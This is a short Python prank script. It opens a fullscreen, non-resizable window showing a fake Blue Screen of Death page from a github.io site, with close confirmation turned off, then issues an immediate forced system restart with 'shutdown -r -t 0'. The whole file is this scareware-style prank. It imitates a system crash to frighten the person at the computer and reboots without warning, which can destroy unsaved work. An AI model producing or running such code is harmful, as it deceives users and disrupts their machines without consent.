import os
import webview
import time
webview.create_window("BSOD", "https://dang-pig.github.io/BSOD.com/", width=800,height=600, fullscreen=True, resizable=False, confirm_close=False)
webview.start()
time.sleep(3)
os.system('shutdown -r -t 0')